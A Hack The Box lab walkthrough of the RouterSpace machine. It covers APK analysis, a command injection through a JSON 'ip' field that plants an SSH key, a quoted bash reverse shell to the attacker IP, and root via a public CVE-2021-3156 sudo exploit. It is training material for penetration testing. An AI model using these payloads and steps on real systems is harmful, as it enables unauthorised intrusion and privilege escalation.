# HTB RouterSpace — Full Walkthrough

**Difficulty:** Easy  
**OS:** Linux  
**IP:** 10.129.227.47  
**Attacker IP:** 10.10.16.84  

---

## Table of Contents
1. [Mindset & Methodology](#mindset)
2. [Step 1 — Reconnaissance](#step-1)
3. [Step 2 — Web Enumeration](#step-2)
4. [Step 3 — APK Analysis (Static)](#step-3)
5. [Step 4 — Testing the API Endpoint](#step-4)
6. [Step 5 — Command Injection](#step-5)
7. [Step 6 — Getting a Shell as paul](#step-6)
8. [Step 7 — User Flag](#step-7)
9. [Step 8 — Privilege Escalation Enumeration](#step-8)
10. [Step 9 — Exploiting CVE-2021-3156 (Baron Samedit)](#step-9)
11. [Step 10 — Root Flag](#step-10)
12. [Lessons Learned](#lessons)

---

## Mindset & Methodology <a name="mindset"></a>

Before touching any machine, understand the hacker's core loop:

```
Enumerate → Find Attack Surface → Exploit → Enumerate Again → Escalate
```

Every step feeds the next. You never skip enumeration — even when you think you know what to do. Information you ignore early often comes back to bite you later.

The golden rule: **follow the data, not assumptions.**

---

## Step 1 — Reconnaissance <a name="step-1"></a>

### What we do
```bash
nmap -p- --min-rate 10000 10.129.227.47
```

### Why this command
- `-p-` scans **all 65535 ports**, not just the top 1000. Services can run on non-standard ports — missing one means missing an attack vector.
- `--min-rate 10000` speeds up the scan. On HTB labs (controlled environments) this is safe. On real engagements you would slow this down to avoid detection.

### What we found
```
22/tcp open  ssh
80/tcp open  http
```

### Hacker mindset
Two ports means a small attack surface. SSH (22) is almost never the entry point — brute-forcing SSH is loud and usually fruitless without credentials. HTTP (80) is the interesting one. **Web applications are almost always where you start.**

Port 22 gets mentally filed away as: *"useful later once I have credentials or a key."*

---

## Step 2 — Web Enumeration <a name="step-2"></a>

### What we do
First, add the hostname to `/etc/hosts` so the machine resolves by name:

```bash
echo "10.129.227.47 routerspace.htb" | sudo tee -a /etc/hosts
```

### Why add a hostname
Many web apps behave differently depending on the `Host` header in HTTP requests. Virtual hosting means the server may only show you the right content if you use the correct domain name. Always add `<ip> <boxname>.htb` as a habit.

### Browse to the site
Visit `http://routerspace.htb` in a browser.

You find a simple marketing page for a router management app. The only interactive element is a **Download** button that gives you `RouterSpace.apk`.

### What we download
```bash
wget http://routerspace.htb/RouterSpace.apk -P /home/kali/Downloads/htb/
```

### Hacker mindset
When a website offers a downloadable file — especially an app — **download it immediately.** Apps are goldmines: they contain API endpoints, hardcoded credentials, encryption keys, and business logic. This is your primary lead.

Directory brute-forcing this site returns nothing useful (the server returns 200 for everything, making it noisy). The APK is the real attack surface.

---

## Step 3 — APK Analysis (Static) <a name="step-3"></a>

### What is an APK
An APK (Android Package) is essentially a zip file containing:
- Compiled Java/Kotlin bytecode (`.dex` files)
- Resources (images, layouts, strings)
- A manifest file describing the app
- Any bundled JavaScript (for React Native apps)

### Unpacking the APK
```bash
apktool d RouterSpace.apk
```

This decompiles the APK into human-readable form. You get directories like `smali/` (disassembled bytecode), `assets/`, and `AndroidManifest.xml`.

### What to look for
**AndroidManifest.xml** — tells you what the app does, what permissions it needs, and what components it has.

**assets/index.android.bundle** — if it's a React Native app, all the JavaScript logic lives here. This includes API calls, endpoints, and sometimes credentials.

### Key findings
- The app is built with **React Native** (JavaScript running on Android)
- The certificate in `original/META-INF/CERT.RSA` contains the string `routerspace.htb` — confirms our hostname guess
- The JavaScript bundle (though obfuscated) reveals the app makes POST requests to `/api/v4/monitoring/router/dev/check/deviceAccess`

### Hacker mindset
You do NOT need a working Android emulator to hack this. That's a trap beginners fall into — spending hours setting up Genymotion or Android Studio. **The goal is to understand what the app sends to the server, then replicate it yourself with curl.** Static analysis gets you the endpoint and headers without ever running the app.

---

## Step 4 — Testing the API Endpoint <a name="step-4"></a>

### What we know so far
From static analysis:
- Endpoint: `POST /api/v4/monitoring/router/dev/check/deviceAccess`
- The app sends JSON with an `ip` field
- The `User-Agent` must be `RouterSpaceAgent` (the server rejects other values)

### Test the endpoint
```bash
curl -s \
  -H 'User-Agent: RouterSpaceAgent' \
  -H 'Content-Type: application/json' \
  -d '{"ip":"0.0.0.0"}' \
  http://routerspace.htb/api/v4/monitoring/router/dev/check/deviceAccess
```

### Response
```
"0.0.0.0\n"
```

### What this tells us
The server is **echoing our input back**. This is a huge hint. When a server takes user input, does *something* with it server-side, and returns a result — it's almost certainly passing that input to a system command or function. 

The question becomes: *what is the server doing with this IP?* Possibilities:
- Running `ping <ip>`
- Running `traceroute <ip>`
- Passing it to some custom shell script

Any of these would be vulnerable to **command injection** if the input isn't sanitized.

### Hacker mindset
Whenever you see "input goes in, result comes out," think: *what process is handling this?* If there's a shell involved anywhere in that chain, you can inject commands. The echo behavior is a dead giveaway that the server is processing your string in a shell context.

---

## Step 5 — Command Injection <a name="step-5"></a>

### What is command injection
When a web application passes user-controlled input directly to a system shell command without sanitization, you can terminate the intended command and append your own. For example, if the server runs:

```bash
ping -c 1 <user_input>
```

And you supply `0.0.0.0; id`, the shell interprets this as:

```bash
ping -c 1 0.0.0.0; id
```

The `;` ends the `ping` command and starts a new one (`id`), which runs as whatever user the web server process belongs to.

### Test it
```bash
curl -s \
  -H 'User-Agent: RouterSpaceAgent' \
  -H 'Content-Type: application/json' \
  -d '{"ip":"0.0.0.0; id"}' \
  http://routerspace.htb/api/v4/monitoring/router/dev/check/deviceAccess
```

### Response
```
"0.0.0.0\nuid=1001(paul) gid=1001(paul) groups=1001(paul)\n"
```

**We have Remote Code Execution (RCE) as user `paul`.**

### Why not get a reverse shell
The machine has an outbound firewall — it blocks connections from the target back to us. A classic bash reverse shell like `bash -i >& /dev/tcp/10.10.16.84/4444 0>&1` just hangs.

This is common on HTB and real environments. **When you can't get a shell back, pivot to writing files instead.** We have RCE — we can read and write files on the server. That's enough to plant an SSH key.

### Hacker mindset
Firewalls block outbound. But the *server* can still accept inbound SSH connections on port 22 (that's what it's there for). Instead of making the server call us, we make ourselves able to log in as paul via SSH. Plant our public key → connect legitimately.

---

## Step 6 — Getting a Shell as paul <a name="step-6"></a>

### How SSH key authentication works
SSH supports two login methods:
1. **Password** — you type a password
2. **Key pair** — you have a private key locally, and the server has your public key in `~/.ssh/authorized_keys`

If the server finds your public key in `authorized_keys`, it grants access without a password. We can *write* our public key there using our RCE.

### Generate an SSH key pair on Kali
```bash
ssh-keygen -t ed25519 -f /home/kali/.ssh/routerspace -N ""
```

- `-t ed25519` — modern, fast elliptic curve key type
- `-f` — file path to save the key
- `-N ""` — no passphrase (empty, for convenience)

This creates two files:
- `/home/kali/.ssh/routerspace` — your **private key** (never share this)
- `/home/kali/.ssh/routerspace.pub` — your **public key** (safe to share/plant)

### Plant the public key via RCE
```bash
curl -s \
  -H 'User-Agent: RouterSpaceAgent' \
  -H 'Content-Type: application/json' \
  -d "{\"ip\":\"0.0.0.0; mkdir -p /home/paul/.ssh && echo '$(cat /home/kali/.ssh/routerspace.pub)' >> /home/paul/.ssh/authorized_keys\"}" \
  http://routerspace.htb/api/v4/monitoring/router/dev/check/deviceAccess
```

Breaking down the injected command:
- `mkdir -p /home/paul/.ssh` — create the `.ssh` directory if it doesn't exist (`-p` suppresses errors if it already exists)
- `&&` — only run the next command if the previous succeeded
- `echo '<pubkey>' >> authorized_keys` — append our public key (`>>` appends, `>` would overwrite)

### Connect via SSH
```bash
ssh -i /home/kali/.ssh/routerspace paul@routerspace.htb
```

You're in.

### Hacker mindset
We went from "I can run commands" to "I have an interactive shell" by leveraging what we had access to. No fancy exploit — just logic: SSH exists, we can write files, keys allow passwordless SSH login. Chain the primitives together.

---

## Step 7 — User Flag <a name="step-7"></a>

```bash
cat /home/paul/user.txt
```

```
83531[redacted]735eda2222
```

---

## Step 8 — Privilege Escalation Enumeration <a name="step-8"></a>

### The goal
We're logged in as `paul` (a regular user). We need to become `root` to read `/root/root.txt`. This is called **privilege escalation**.

### What to check first
Always start by checking the sudo version — it's a common escalation path:

```bash
sudo --version
```

Or use a quick vulnerability check from the CVE-2021-3156 advisory:

```bash
sudoedit -s Y
```

- If it **prompts for a password** → vulnerable to Baron Samedit
- If it **prints usage/help** → patched

### Response
```
[sudo] password for paul:
```

**Vulnerable.**

### Hacker mindset
Before running automated tools like LinPEAS, do quick manual checks for known critical vulns first. CVE-2021-3156 was patched in January 2021 — machines released around or before that date are often still vulnerable. The `sudoedit -s Y` one-liner is a near-instant check. Fast wins first.

---

## Step 9 — Exploiting CVE-2021-3156 (Baron Samedit) <a name="step-9"></a>

### What is Baron Samedit
CVE-2021-3156 is a **heap-based buffer overflow** in `sudo` discovered by Qualys in January 2021. It affects sudo versions 1.8.2 through 1.8.31p2 and 1.9.0 through 1.9.5p1.

The vulnerability: when `sudoedit` is invoked with a trailing backslash in an argument, it incorrectly unescapes the argument, overflowing a heap buffer. Because `sudo` runs as root (it's a setuid binary), this overflow can be exploited to gain a root shell.

You don't need to understand the heap exploitation internals — you just need to know:
1. It exists
2. The target is vulnerable
3. There's a public PoC

### On Kali — download the exploit
```bash
cd /tmp
wget https://codeload.github.com/blasty/CVE-2021-3156/zip/main -O CVE-2021-3156.zip
unzip CVE-2021-3156.zip
```

### Transfer to the target
Because outbound connections are blocked, we use SCP (which goes *inbound* from Kali to the target over port 22 — allowed):

```bash
scp -i /home/kali/.ssh/routerspace -r /tmp/CVE-2021-3156-main paul@routerspace.htb:/tmp/
```

### On the target — compile and run
```bash
cd /tmp/CVE-2021-3156-main
make
./sudo-hax-me-a-sandwich 1
```

The `1` selects the target profile: **Ubuntu 20.04.1 (Focal Fossa), sudo 1.8.31, libc-2.31**.

The exploit prints its progress and drops you into a root shell:

```
** CVE-2021-3156 PoC by blasty <peter@haxx.in>

using target: Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31
** pray for your rootshell.. **
[+] bl1ng bl1ng! We got it!
# id
uid=0(root) gid=0(root) groups=0(root),1001(paul)
```

### Why index 1 specifically
The exploit targets specific memory offsets that vary by sudo version and libc version. The PoC ships with a list of pre-computed targets. You identify which one matches by checking the OS and sudo version on the target (`lsb_release -a`, `sudo --version`). Ubuntu 20.04 with sudo 1.8.31 is index 1 in blasty's list.

### Hacker mindset
Public PoCs exist for well-known CVEs. The skill isn't writing the exploit from scratch — it's: (1) identifying the vulnerability, (2) finding the right PoC, (3) matching the target profile correctly. Getting the target index wrong means a crash instead of a shell.

---

## Step 10 — Root Flag <a name="step-10"></a>

```bash
cat /root/root.txt
```

```
49e6ee[redacted]537577942
```

---

## Lessons Learned <a name="lessons"></a>

### 1. You don't always need to run the app
The APK was a red herring in terms of setup complexity. Static analysis (reading the decompiled source) gave us everything we needed. The "dynamic analysis with Android emulator" path works, but it's slow and painful. Always try the simple path first.

### 2. Firewalls don't stop you — they redirect you
An outbound firewall kills reverse shells. But if inbound SSH is open and you have file write, you still win. Think about what channels ARE available, not just the ones that are blocked.

### 3. Check sudo version early
Baron Samedit affected a huge number of systems. It's one of the first things worth checking on any Linux target from 2021 or earlier. A 5-second check (`sudoedit -s Y`) can save you hours of enumeration.

### 4. Chain primitives
- RCE → file write → SSH key → interactive shell
- Interactive shell → version check → public exploit → root

Neither jump was a single magic step. Each primitive enabled the next one. This chaining is the core skill of post-exploitation.

### 5. The hacker mindset in one sentence
**"What do I have, what can I do with it, and what does that unlock next?"**

---

*Machine: RouterSpace | Difficulty: Easy | OS: Linux | Category: Android / Command Injection / Known CVE*
